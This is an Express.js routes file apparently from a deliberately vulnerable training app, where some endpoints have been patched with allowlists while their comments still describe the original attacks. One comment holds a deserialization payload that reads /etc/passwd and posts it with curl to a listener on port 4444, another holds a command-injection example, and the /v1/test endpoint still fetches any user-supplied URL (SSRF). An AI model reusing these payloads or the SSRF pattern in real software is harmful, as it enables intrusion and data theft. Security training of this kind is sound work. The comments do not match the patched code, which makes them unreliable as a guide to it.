'user strcit';

module.exports = (app,db) => {

    //Get System/ warehouse information
    /**
     * GET /v1/status/{brand}
     * @summary Check if brand website is available through curl (RCE - Remote Code Execution)
     * @description command execution - brand="bud | whoami"
     * @tags system
     * @param {string} brand.path.required - the beer brand you want to test
     */
    const axios = require('axios');

app.get('/v1/status/:brand', async (req, res) => {
  const brand = req.params.brand;

  // allowlist
  const allowedBrands = ['google', 'facebook', 'twitter'];

  if (!allowedBrands.includes(brand)) {
    return res.status(400).json({ error: 'Invalid brand' });
  }

  try {
    const response = await axios.get(
      `https://letmegooglethat.com/?q=${brand}`
    );
    res.json({ status: response.status });
  } catch (e) {
    res.status(500).json({ error: 'Request failed' });
  }
});

        //redirect user to brand
    /**
     * GET /v1/redirect/
     * @summary Redirect the user the beer brand website (Insecure redirect)
     * @Author 
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     const { URL } = require('url');

app.get('/v1/redirect', (req, res) => {
  const page = req.query.page;

  const allowedPages = [
    '/home',
    '/login',
    '/products'
  ];

  if (!page || !allowedPages.includes(page)) {
    return res.status(400).json({ error: 'Invalid redirect destination' });
  }

  res.redirect(page);
});



    //initialize list of beers
    /**
     * POST /v1/init/
     * @summary Initalize beers from object (Insecure Object Deserialization)
     * @description 
            {"rce":"_$$ND_FUNC$$_function ()
            {require('child_process').exec(
            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
            function(error, stdout, stderr)
            {console.log(stdout) }
            );} () "}


            netcat -l 4444
     * @Author Insecure Object Deserialization
     * @tags system
     * @param {object} request.body.required - the beer brand you want to test
     */
     app.post('/v1/init', (req,res) =>{
    const body = req.body.object;

    let deser;
    try {
        deser = JSON.parse(body);
    } catch (e) {
        return res.status(400).json({ error: "Invalid input" });
    }

    console.log(deser);
    res.status(200).json({ status: "OK" });
});

    //perform a test on an endpoint
    /**
     * GET /v1/test/
     * @summary Perform a get request on another url in the system (SSRF - Server Side Request Forgery)
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     app.get('/v1/test/', (req,res) =>{
         var requests = require('axios')
        var url = req.query.url
        console.log(url)
        if(url){

            requests.get(url)
            .then(Ares => {
                //console.log(Ares);
                res.json({response:Ares.status});
                console.log(`statusCode: ${Ares.status}`);
            })
            .catch(error => {
                console.error(error);
                res.json({response:error});

            });
        } else{
            res.json({error:"No url provided"});

        }
        console.log(res)
            return
        });
};